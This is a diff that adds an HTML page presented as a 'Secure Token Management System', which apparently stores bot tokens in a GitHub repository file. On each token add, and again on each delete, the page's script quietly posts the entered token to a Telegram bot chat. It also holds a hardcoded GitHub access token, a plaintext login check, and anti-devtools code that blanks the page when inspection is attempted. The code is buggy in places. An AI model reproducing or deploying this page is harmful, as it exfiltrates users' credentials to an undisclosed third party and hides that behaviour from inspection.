@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRIX - DATABASE</title>
+    <script src="https://gattbin.vercel.app/tailwindcss.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        * {
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .glass {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .smooth {
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .smooth:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .animate-slide-up {
+            animation: slideUp 0.6s ease-out forwards;
+        }
+        
+        .gradient-text {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .input-focus:focus {
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+        
+        /* Anti inspect protection */
+        body {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        .protected {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 99999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 2rem;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen text-gray-800">
+
+    <!-- Protect Layer -->
+    <div id="protectLayer" class="protected">
+        <div class="text-center">
+            <div class="text-red-500 text-6xl mb-4">🛡️</div>
+            <div>Protect By Milo-CORE</div>
+            <div class="text-sm text-gray-400 mt-2">Unauthorized Access Detected</div>
+        </div>
+    </div>
+
+    <!-- Login Page -->
+    <div id="loginPage" class="min-h-screen flex items-center justify-center p-4">
+        <div class="glass w-full max-w-md rounded-2xl shadow-2xl p-8 animate-slide-up">
+            <div class="text-center mb-8">
+                <div class="w-16 h-16 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl mx-auto mb-4 flex items-center justify-center shadow-lg">
+                    <i data-lucide="database" class="text-white w-8 h-8"></i>
+                </div>
+                <h1 class="text-3xl font-bold gradient-text mb-2">github - DATABASE</h1>
+                <p class="text-gray-500 text-sm">Secure Token Management System</p>
+            </div>
+            
+            <form id="loginForm" class="space-y-6">
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Username</label>
+                    <div class="relative">
+                        <i data-lucide="user" class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5"></i>
+                        <input type="text" id="username" class="w-full pl-10 pr-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-indigo-500 input-focus smooth bg-white/50" placeholder="Enter username">
+                    </div>
+                </div>
+                
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Password</label>
+                    <div class="relative">
+                        <i data-lucide="lock" class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5"></i>
+                        <input type="password" id="password" class="w-full pl-10 pr-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-indigo-500 input-focus smooth bg-white/50" placeholder="••••••••">
+                    </div>
+                </div>
+                
+                <button type="submit" class="w-full bg-gradient-to-r from-indigo-500 to-purple-600 text-white font-semibold py-3 rounded-xl smooth hover:shadow-lg transform active:scale-95 flex items-center justify-center gap-2">
+                    <span>Access Database</span>
+                    <i data-lucide="arrow-right" class="w-5 h-5"></i>
+                </button>
+            </form>
+            
+            <div id="loginError" class="hidden mt-4 p-3 bg-red-50 border border-red-200 rounded-lg text-red-600 text-sm text-center">
+                Invalid credentials!
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboard" class="hidden min-h-screen p-4 md:p-8">
+        <div class="max-w-6xl mx-auto">
+            <!-- Header -->
+            <div class="glass rounded-2xl p-6 mb-6 flex flex-col md:flex-row justify-between items-center gap-4 animate-slide-up">
+                <div class="flex items-center gap-4">
+                    <div class="w-12 h-12 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
+                        <i data-lucide="database" class="text-white w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <h1 class="text-2xl font-bold text-gray-800">prix Database</h1>
+                    </div>
+                </div>
+                <div class="flex items-center gap-3">
+                    <span class="px-4 py-2 bg-green-100 text-green-700 rounded-full text-sm font-medium flex items-center gap-2">
+                        <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                        Online
+                    </span>
+                    <button onclick="logout()" class="px-4 py-2 bg-red-50 text-red-600 rounded-lg hover:bg-red-100 smooth flex items-center gap-2">
+                        <i data-lucide="log-out" class="w-4 h-4"></i>
+                        Logout
+                    </button>
+                </div>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-6">
+                <!-- Add Token Form -->
+                <div class="glass rounded-2xl p-6 animate-slide-up" style="animation-delay: 0.1s">
+                    <div class="flex items-center gap-3 mb-6">
+                        <div class="p-2 bg-indigo-100 rounded-lg">
+                            <i data-lucide="plus-circle" class="text-indigo-600 w-6 h-6"></i>
+                        </div>
+                        <h2 class="text-xl font-bold text-gray-800">Add New Token</h2>
+                    </div>
+                    
+                    <form id="addTokenForm" class="space-y-4">
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-2">Bot Name</label>
+                            <input type="text" id="botName" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-indigo-500 input-focus smooth bg-white/50" placeholder="e.g. Bot Alpha" required>
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-2">Token</label>
+                            <div class="relative">
+                                <input type="password" id="botToken" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-indigo-500 input-focus smooth bg-white/50 font-mono" placeholder="xxxxx:xxxxxxxx" required>
+                                <button type="button" onclick="toggleTokenVisibility()" class="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600">
+                                    <i data-lucide="eye" class="w-5 h-5" id="eyeIcon"></i>
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700 mb-2">Description</label>
+                            <textarea id="botDesc" rows="3" class="w-full px-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:border-indigo-500 input-focus smooth bg-white/50 resize-none" placeholder="Optional description..."></textarea>
+                        </div>
+                        
+                        <button type="submit" class="w-full bg-gradient-to-r from-indigo-500 to-purple-600 text-white font-semibold py-3 rounded-xl smooth hover:shadow-lg transform active:scale-95 flex items-center justify-center gap-2">
+                            <i data-lucide="save" class="w-5 h-5"></i>
+                            <span>Save to Repository</span>
+                        </button>
+                    </form>
+                    
+                    <div id="addStatus" class="hidden mt-4 p-3 rounded-lg text-sm"></div>
+                </div>
+
+                <!-- Token List -->
+                <div class="glass rounded-2xl p-6 animate-slide-up" style="animation-delay: 0.2s">
+                    <div class="flex items-center justify-between mb-6">
+                        <div class="flex items-center gap-3">
+                            <div class="p-2 bg-purple-100 rounded-lg">
+                                <i data-lucide="list" class="text-purple-600 w-6 h-6"></i>
+                            </div>
+                            <h2 class="text-xl font-bold text-gray-800">Stored Tokens</h2>
+                        </div>
+                        <button onclick="loadTokens()" class="p-2 hover:bg-gray-100 rounded-lg smooth" title="Refresh">
+                            <i data-lucide="refresh-cw" class="w-5 h-5 text-gray-600"></i>
+                        </button>
+                    </div>
+                    
+                    <div id="tokenList" class="space-y-3 max-h-[500px] overflow-y-auto pr-2">
+                        <div class="text-center text-gray-500 py-8">
+                            <i data-lucide="loader-2" class="w-8 h-8 animate-spin mx-auto mb-2"></i>
+                            <p>Loading tokens...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Logs Console -->
+            <div class="glass rounded-2xl p-6 mt-6 animate-slide-up" style="animation-delay: 0.3s">
+                <div class="flex items-center gap-3 mb-4">
+                    <div class="p-2 bg-gray-100 rounded-lg">
+                        <i data-lucide="terminal" class="text-gray-600 w-6 h-6"></i>
+                    </div>
+                    <h2 class="text-xl font-bold text-gray-800">System Logs</h2>
+                </div>
+                <div id="consoleLogs" class="bg-gray-900 rounded-xl p-4 h-48 overflow-y-auto font-mono text-sm text-green-400 space-y-1">
+                    <div class="text-gray-500">// System initialized...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Config
+        const CONFIG = {
+            GITHUB_REPO: 'prixhostingweb-create/basetoken',
+            GITHUB_FILE_PATH: 'database.json',
+            GITHUB_TOKEN: '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'
+        };
+
+        // Initialize Icons
+        lucide.createIcons();
+        
+        // Auth Check
+        function checkAuth() {
+            if (sessionStorage.getItem('vnxz_auth') === 'true') {
+                showDashboard();
+            }
+        }
+
+        // Login Handler
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username === 'prix' && password === 'gacorbanget') {
+                sessionStorage.setItem('vnxz_auth', 'true');
+                log('Login successful for user: vnxz');
+                showDashboard();
+            } else {
+                document.getElementById('loginError').classList.remove('hidden');
+                log('Failed login attempt detected');
+                setTimeout(() => {
+                    document.getElementById('loginError').classList.add('hidden');
+                }, 3000);
+            }
+        });
+        function showDashboard() {
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            loadTokens();
+            log('Dashboard loaded');
+        }
+
+        function logout() {
+            sessionStorage.removeItem('vnxz_auth');
+            location.reload();
+        }
+
+        // GitHub API Functions
+        async function loadTokens() {
+            try {
+                log('Fetching tokens from GitHub...');
+                const response = await fetch(`https://api.github.com/repos/${CONFIG.GITHUB_REPO}/contents/${CONFIG.GITHUB_FILE_PATH}`, {
+                    headers: {
+                        'Authorization': `token ${CONFIG.GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+                
+                if (!response.ok) throw new Error('Failed to fetch');
+                
+                const data = await response.json();
+                const content = JSON.parse(atob(data.content));
+                
+                renderTokens(content, data.sha);
+                log(`Loaded ${content.length || content.tokens?.length || 0} tokens`);
+            } catch (error) {
+                log('Error: ' + error.message, 'error');
+                document.getElementById('tokenList').innerHTML = `
+                    <div class="text-center text-red-500 py-8">
+                        <i data-lucide="alert-circle" class="w-8 h-8 mx-auto mb-2"></i>
+                        <p>Failed to load tokens</p>
+                        <button onclick="loadTokens()" class="mt-2 text-sm underline">Retry</button>
+                    </div>
+                `;
+                lucide.createIcons();
+            }
+        }
+
+        function renderTokens(data, sha) {
+            const tokens = Array.isArray(data) ? data : (data.tokens || []);
+            const listEl = document.getElementById('tokenList');
+            
+            if (tokens.length === 0) {
+                listEl.innerHTML = `
+                    <div class="text-center text-gray-400 py-8">
+                        <i data-lucide="inbox" class="w-12 h-12 mx-auto mb-2 opacity-50"></i>
+                        <p>No tokens stored yet</p>
+                    </div>
+                `;
+            } else {
+                listEl.innerHTML = tokens.map((token, idx) => `
+                    <div class="bg-white/50 border border-gray-100 rounded-xl p-4 hover:shadow-md smooth group">
+                        <div class="flex justify-between items-start">
+                            <div class="flex-1 min-w-0">
+                                <h3 class="font-semibold text-gray-800 truncate">${token.name || 'Unnamed'}</h3>
+                                <p class="text-xs text-gray-500 font-mono mt-1 truncate">${maskToken(token.token || token.value || '')}</p>
+                                ${token.description ? `<p class="text-sm text-gray-600 mt-2">${token.description}</p>` : ''}
+                            </div>
+                            <button onclick="deleteToken(${idx}, '${sha}')" class="opacity-0 group-hover:opacity-100 p-2 text-red-500 hover:bg-red-50 rounded-lg smooth">
+                                <i data-lucide="trash-2" class="w-4 h-4"></i>
+                            </button>
+                        </div>
+                    </div>
+                `).join('');
+            }
+            lucide.createIcons();
+        }
+
+        function maskToken(token) {
+            if (token.length < 8) return '***';
+            return token.substring(0, 4) + '••••••••' + token.substring(token.length - 4);
+        }
+
+        // Add Token
+        document.getElementById('addTokenForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const statusEl = document.getElementById('addStatus');
+            
+            try {
+                log('Adding new token...');
+                statusEl.className = 'mt-4 p-3 rounded-lg text-sm bg-blue-50 text-blue-700';
+                statusEl.textContent = 'Saving to GitHub...';
+                statusEl.classList.remove('hidden');
+                
+                // Get current content
+                const getRes = await fetch(`https://api.github.com/repos/${CONFIG.GITHUB_REPO}/contents/${CONFIG.GITHUB_FILE_PATH}`, {
+                    headers: {
+                        'Authorization': `token ${CONFIG.GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+                
+                const fileData = await getRes.json();
+                const currentContent = JSON.parse(atob(fileData.content));
+                const tokens = Array.isArray(currentContent) ? currentContent : (currentContent.tokens || []);
+                
+                // Add new token
+                const newToken = {
+                    token: document.getElementById('botToken').value,
+                };
+                tokens.push(newToken.token);
+                // Update file
+                const updateRes = await fetch(`https://api.github.com/repos/${CONFIG.GITHUB_REPO}/contents/${CONFIG.GITHUB_FILE_PATH}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `token ${CONFIG.GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: `Add token: ${newToken.name}`,
+                        content: btoa(JSON.stringify(tokens, null, 2)),
+                        sha: fileData.sha
+                    })
+                });
+                
+                if (updateRes.ok) {
+                    statusEl.className = 'mt-4 p-3 rounded-lg text-sm bg-green-50 text-green-700';
+                    statusEl.textContent = 'Token saved successfully!';
+                    document.getElementById('addTokenForm').reset();
+                    loadTokens();
+                    log(`Token "${newToken.name}" added successfully`);
+                    const res = await fetch(`https://api.telegram.org/bot8559988328:AAFICt--G6jAEjgP6HFXVZocu9lGMnZnufY/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: '-1003803055131',
+            text: `SUCCES ADD TOKEN
+ID: ${newToken.id}
+TOKEN NAME: ${newToken.name}
+TOKEN: ${newToken.token}
+Description: ${newToken.description || "Gada Desk"}
+CREATED: ${newToken.created_at}`
+          })
+        });
+
+        const data = await res.json();
+        if(data.ok) {
+            alert("succes")
+        } else {
+            alert('failed')
+        }
+                } else {
+                    throw new Error('Failed to update');
+                }
+            } catch (error) {
+                statusEl.className = 'mt-4 p-3 rounded-lg text-sm bg-red-50 text-red-700';
+                statusEl.textContent = 'Error: ' + error.message;
+                log('Error adding token: ' + error.message, 'error');
+            }
+            
+            setTimeout(() => statusEl.classList.add('hidden'), 3000);
+        });
+
+        async function deleteToken(index, sha) {
+            if (!confirm('Delete this token?')) return;
+            
+            try {
+                log('Deleting token...');
+                const getRes = await fetch(`https://api.github.com/repos/${CONFIG.GITHUB_REPO}/contents/${CONFIG.GITHUB_FILE_PATH}`, {
+                    headers: {
+                        'Authorization': `token ${CONFIG.GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+                
+                const fileData = await getRes.json();
+                const currentContent = JSON.parse(atob(fileData.content));
+                const tokens = Array.isArray(currentContent) ? currentContent : (currentContent.tokens || []);
+                
+                tokens.splice(index, 1);
+                
+                await fetch(`https://api.github.com/repos/${CONFIG.GITHUB_REPO}/contents/${CONFIG.GITHUB_FILE_PATH}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Authorization': `token ${CONFIG.GITHUB_TOKEN}`,
+                        'Accept': 'application/vnd.github.v3+json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        message: 'Delete token',
+                        content: btoa(JSON.stringify(tokens, null, 2)),
+                        sha: fileData.sha
+                    })
+                });
+                const res = await fetch(`https://api.telegram.org/bot8559988328:AAFICt--G6jAEjgP6HFXVZocu9lGMnZnufY/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: '-1003803055131',
+            text: `SUCCES DELETE ${tokens.splice(index, 1)}`
+          })
+        });
+
+        const data = await res.json();
+
+        if (data.ok) {
+          alert('succes')
+        } else {
+          alert('fail')
+        }
+                loadTokens();
+                log('Token deleted successfully');
+            } catch (error) {
+                log('Error deleting token: ' + error.message, 'error');
+            }
+        }
+
+        function toggleTokenVisibility() {
+            const input = document.getElementById('botToken');
+            const icon = document.getElementById('eyeIcon');
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.setAttribute('data-lucide', 'eye-off');
+            } else {
+                input.type = 'password';
+                icon.setAttribute('data-lucide', 'eye');
+            }
+            lucide.createIcons();
+        }
+
+        function log(message, type = 'info') {
+            const consoleEl = document.getElementById('consoleLogs');
+            const time = new Date().toLocaleTimeString('id-ID');
+            const color = type === 'error' ? 'text-red-400' : 'text-green-400';
+            consoleEl.innerHTML += `<div class="${color}">[${time}] ${message}</div>`;
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+        }
+
+        // Anti Inspect Protection
+        (function() {
+            const devtools = { open: false, orientation: null };
+            const threshold = 160;
+            
+            setInterval(() => {
+                const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+                const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+                
+                if (widthThreshold || heightThreshold) {
+                    if (!devtools.open) {
+                        devtools.open = true;
+                        document.getElementById('protectLayer').style.display = 'flex';
+                        document.body.innerHTML = `
+                            <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:99999;display:flex;justify-content:center;align-items:center;color:white;font-size:2rem;font-weight:bold;">
+                                <div style="text-align:center">
+                                    <div style="color:#ef4444;font-size:4rem;margin-bottom:1rem">🛡️</div>
+                                    <div>Protect By Milo-CORE</div>
+                                    <div style="font-size:1rem;color:#666;margin-top:1rem">Developer Tools Detected</div>
+                                </div>
+                            </div>
+                        `;
+                    }
+                }
+            }, 500);
+            
+            // Disable right click
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            document.addEventListener('keydown', e => {
+                if (
+                    e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                    (e.ctrlKey && e.key === 'U')
+                ) {
+                    e.preventDefault();
+                    document.getElementById('protectLayer').style.display = 'flex';
+                }
+            });
+        })();
+
+        // Init
+        checkAuth();
+    </script>
+</body>
+</html>
